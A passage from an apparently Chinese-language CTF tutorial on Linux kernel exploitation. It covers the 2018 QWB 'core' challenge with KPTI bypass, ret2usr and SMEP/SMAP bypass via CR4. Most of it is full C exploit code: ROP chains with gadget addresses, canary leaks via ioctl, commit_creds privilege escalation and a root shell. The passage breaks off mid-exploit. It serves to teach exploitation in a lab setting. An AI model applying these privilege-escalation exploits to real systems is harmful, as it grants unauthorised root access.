rop_chain[i++] = user_sp;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x800</span>);<br>    coreCopyFunc(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>编译指令：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">$</span><span class="bash"> gcc ./exploit.c -o exploit -static -masm=intel</span><br></code></pre></div></td></tr></table></figure><p>本地调试的话重新打包即可</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">$</span><span class="bash"> find . | cpio -o -H newc &gt; ../core.cpio</span><br></code></pre></div></td></tr></table></figure><p>运行即可获得root shell</p><p><a href="https://i.loli.net/2021/03/09/4InLOlstS3UZiPh.png"><img src="https://s2.loli.net/2023/02/06/YOe2KzXNygfErZs.png" alt="image.png" style="zoom:50%;" /></a></p><h2 id="返回用户态-with-KPTI-bypass"><a href="#返回用户态-with-KPTI-bypass" class="headerlink" title="返回用户态 with KPTI bypass"></a>返回用户态 with KPTI bypass</h2><p>对于开启了 KPTI（内核页表隔离），我们<strong>不能像之前那样直接 swapgs ; iret 返回用户态</strong>，而是在返回用户态之前还<strong>需要将用户进程的页表给切换回来</strong></p><p>众所周知 Linux 采用<strong>四级页表</strong>结构（PGD-&gt;PUD-&gt;PMD-&gt;PTE），而 CR3 控制寄存器用以存储当前的 PGD 的地址，因此在开启 KPTI 的情况下用户态与内核态之间的切换便涉及到 CR3 的切换，为了提高切换的速度，内核将内核空间的 PGD 与用户空间的 PGD 两张页全局目录表放在一段连续的内存中（两张表，一张一页4k，总计8k，内核空间的在低地址，用户空间的在高地址），这样<strong>只需要将 CR3 的第 13 位取反便能完成页表切换的操作</strong></p><p><a href="https://i.loli.net/2021/09/10/Rm8Ti9MpVUZ7fPK.png"><img src="https://s2.loli.net/2023/02/06/9CYOpuld2cLvXbM.png" alt="image.png"></a></p><p>需要进行说明的是，<strong>在这两张页表上都有着对用户内存空间的完整映射，但在用户页表中只映射了少量的内核代码（例如系统调用入口点、中断处理等），而只有在内核页表中才有着对内核内存空间的完整映射</strong>，如下图所示，左侧是未开启 KPTI 后的页表布局，右侧是开启了 KPTI 后的页表布局</p><p><strong>KPTI 同时还令内核页表中用户地址空间部分对应的页顶级表项不再拥有执行权限（NX），这使得 ret2usr 彻底成为过去式</strong></p><blockquote><p>在 64 位下用户空间与内核空间都占 128 TB，所以他们占用的页全局表项（PGD）的大小应当是相同的，图上没有体现出来，因此这里由笔者代为补充说明（笑）</p></blockquote><p><a href="https://s2.loli.net/2022/03/11/q74X6lbTnrNGhC1.png"><img src="https://s2.loli.net/2022/03/11/q74X6lbTnrNGhC1.png" alt="image.png"></a></p><blockquote><p>笔者以前学习 KPTI 时看了一篇某乎上的文章说是用户空间一张页表，内核空间一张页表，<strong>实现完整的隔离</strong>，笔者一度信以为真，后面想想不对劲，<strong>如果用户空间与内核空间真是完全隔离的话他们之间甚至无法进行数据交换，因此必定在某个节点上同时存在着完整的对用户空间与内核空间的映射</strong>，这个节点就是当 CPU 运行在内核态时</p></blockquote><p>除了在系统调用入口中将用户态页表切换到内核态页表的代码外，内核也相应地在 <code>arch/x86/entry/entry_64.S</code> 中提供了一个用于完成内核态页表切换回到用户态页表的函数 <code>swapgs_restore_regs_and_return_to_usermode</code>，地址可以在 <code>/proc/kallsyms</code> 中获得</p><p>源码的 AT&amp;T 汇编比较反人类，推荐直接查看 IDA 的反汇编结果（亲切的 Intel 风格）：</p><p><a href="https://i.loli.net/2021/09/10/FpymLdwJMnRU4hi.png"><img src="https://s2.loli.net/2023/02/06/hEyfdNLU36Mq7Jr.png" alt="image.png"></a></p><p>在实际操作时前面的一些栈操作都可以跳过，直接从 <code>mov rdi, rsp</code> 开始，这个函数大概可以总结为如下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ASSEMBLY">mov  rdi, cr3<br>or rdi, 0x1000<br>mov  cr3, rdi<br>pop rax<br>pop rdi<br>swapgs<br>iretq<br></code></pre></div></td></tr></table></figure><p>因此我们只需要布置出如下栈布局即可：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs AWK">↓   swapgs_restore_regs_and_return_to_usermode<br>    <span class="hljs-number">0</span> <span class="hljs-regexp">//</span> padding<br>    <span class="hljs-number">0</span> <span class="hljs-regexp">//</span> padding<br>    user_shell_addr<br>    user_cs<br>    user_rflags<br>    user_sp<br>    user_ss<br></code></pre></div></td></tr></table></figure><p>我们同时也可以看出这是一个极好的用来进行调栈的函数</p><blockquote><p>KPTI bypass 这里就不放例题了，因为和前面的返回用户态而言仅有 gadget 以及栈布局上的微小差别</p></blockquote><h1 id="Kernel-ROP-ret2usr"><a href="#Kernel-ROP-ret2usr" class="headerlink" title="Kernel ROP - ret2usr"></a>Kernel ROP - ret2usr</h1><p><strong>在【未】开启SMAP/SMEP保护的情况下</strong>，用户空间无法访问内核空间的数据，但是内核空间可以访问/执行用户空间的数据，因此 ret2usr 这种攻击手法应运而生——通过 kernel ROP 以内核的 ring 0 权限执行用户空间的代码以完成提权</p><p>通常 CTF 中的 ret2usr 还是以执行<code>commit_creds(prepare_kernel_cred(NULL))</code>进行提权为主要的攻击手法，不过相比起构造冗长的ROP chain，ret2usr 只需我们要提前在用户态程序构造好对应的函数指针、获取相应函数地址后直接 ret 回到用户空间执行即可</p><p>✳ 对于开启了<code>SMAP/SMEP保护</code>的 kernel 而言，<strong>内核空间尝试直接访问用户空间会引起 kernel panic</strong></p><p>通常情况下的报错信息大概如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL">[    7.168919] unable to execute userspace code (SMEP?) (uid: 1000)<br>[    7.170547] BUG: unable to handle kernel paging request at 0000000000401d8a<br>[    7.171399] IP: 0x401d8a<br>[    7.171598] PGD 800000000fb5e067 P4D 800000000fb5e067 PUD fb5f067 PMD fb59065<br>[    7.172087] Oops: 0011 [#1] SMP PTI<br>// 调用栈回溯<br>[    7.186319] Kernel panic - not syncing: Fatal exception<br>[    7.187391] Kernel Offset: 0x32800000 from 0xffffffff81000000 (relocation ra)<br>[    7.188504] Rebooting in 1 seconds.. <br></code></pre></div></td></tr></table></figure><h2 id="例题：强网杯2018-core-1"><a href="#例题：强网杯2018-core-1" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h2><blockquote><p>好像也找不到别的纯 ret2usr 的题了，kernel pwn 的题太少了…<del>但是你又⑧能⑧学</del></p></blockquote><p>具体的这里就不再重复分析了，由于其未开启 smap/smep 保护，故可以考虑在<strong>用户地址空间中构造好对应的函数指针后直接 ret2usr 以提权</strong>，我们只需要将代码稍加修改即可</p><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>  IRETQ 0xffffffff813eb448</span><br><br><span class="hljs-keyword">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-keyword">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-keyword">int</span> (*commit_creds_ptr)(<span class="hljs-keyword">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">coreRead</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setOffValue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">size_t</span> off)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, off);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">coreCopyFunc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">size_t</span> nbytes)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, nbytes);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    saveStatus();<br><br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//get the addr</span><br>    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-keyword">size_t</span> addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">size_t</span> offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-comment">// get the canary</span><br>    <span class="hljs-keyword">size_t</span> canary;<br>    setOffValue(fd, <span class="hljs-number">64</span>);<br>    coreRead(fd, buf);<br>    canary = ((<span class="hljs-keyword">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">//construct the ropchain</span><br>    <span class="hljs-keyword">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">10</span>;i++)<br>        rop_chain[i] = canary;<br>    rop_chain[i++] = (<span class="hljs-keyword">size_t</span>)getRootPrivilige;<br>    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = IRETQ + offset;<br>    rop_chain[i++] = (<span class="hljs-keyword">size_t</span>)getRootShell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x800</span>);<br>    coreCopyFunc(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>重新打包，运行，成功获取root权限</p><p><a href="https://i.loli.net/2021/03/10/ZJr5aWSmlBM8AXt.png"><img src="https://s2.loli.net/2023/02/06/pYjz5q6hc9THVJk.png" alt="image.png"></a></p><h2 id="ret2usr-with-SMAP-SMEP-BYPASS"><a href="#ret2usr-with-SMAP-SMEP-BYPASS" class="headerlink" title="ret2usr with SMAP/SMEP BYPASS"></a>ret2usr with SMAP/SMEP BYPASS</h2><p>前面我们讲到，当 kernel 开启 SMEP 保护时，ret2usr 这种攻击手法将会引起 kernel panic，因此若是我们仍然想要进行 ret2usr 攻击，则需要先关闭 SMEP 保护</p><p>Intel 下系统根据 CR4 控制寄存器的第 20、21 位标识是否开启 SMEP、SMAP 保护（1为开启，0为关闭），<strong>若是能够改变 CR4 寄存器的值便能够关闭 SMEP/SMAP 保护</strong>，完成 SMAP/SMEP-bypass，接下来就能够重新进行 ret2usr</p><p><a href="https://i.loli.net/2021/09/07/sYFKuZiUVNIclBp.png"><img src="https://s2.loli.net/2023/02/06/4s1trBAdPvn2G6T.png" alt="image.png"></a></p><p>我们可以通过如下命令查看CPU相关信息，其中包括开启的保护类型：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">$</span><span class="bash"> cat /proc/cpuinfo</span><br></code></pre></div></td></tr></table></figure><h3 id="例题：强网杯2018-core-2"><a href="#例题：强网杯2018-core-2" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h3><blockquote><p><del>又是 core！典中典的 kernel pwn 入门题！</del></p></blockquote><p>这一次我们在启动脚本中添加上 smep 与 smap 的选项：</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SH">qemu-system-x86_64 \<br>-m 128M \<br>-cpu qemu64-v1,+smep,+smap \<br>-kernel ./bzImage \<br>-initrd  ./rootfs.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \<br>-s  \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic  \<br></code></pre></div></td></tr></table></figure><p>之后我们重新运行之前的 ret2usr 的 exp，发现直接 kernel panic 了，这是因为我们想要执行用户空间的函数指针，触发了 SMEP 保护</p><p><a href="https://s2.loli.net/2022/05/07/f2MXaqwC7kgRx8G.png"><img src="https://s2.loli.net/2023/02/06/gnSDeomsQIaMUNd.png" alt="image.png"></a></p><p>那么这里我们只需要通过 ROP 来关闭 SMEP&amp;SMAP 即可继续 ret2usr，这里笔者用与运算将 SMEP 与 SMAP 的两位给清除掉了，实际上直接给 cr4 赋值 <code>0x6f0</code> 也是可以的（通常关了以后都是这个值）</p><p>前面我们使用 swapgs 和 iret 两条指令来返回用户态，这一次我们直接使用 <code>swapgs_restore_regs_and_return_to_usermode</code> 来返回用户态</p><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RAX_RET 0xffffffff810520cf</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RAX_CR4_ADD_RSP_8_POP_RBP_RET 0xffffffff8106669c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> AND_RAX_RDI_RET 0xffffffff8102b45b</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_CR4_RAX_PUSH_RCX_POPFQ_RET 0xffffffff81002515</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PUSHFQ_POP_RBX_RET 0xffffffff81131da4</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IRETQ 0xffffffff813eb448</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a008da</span><br><br><span class="hljs-keyword">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-keyword">void</span> *);<br><span class="hljs-keyword">int</span> (*commit_creds_ptr)(<span class="hljs-keyword">void</span> *);<br><br><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> 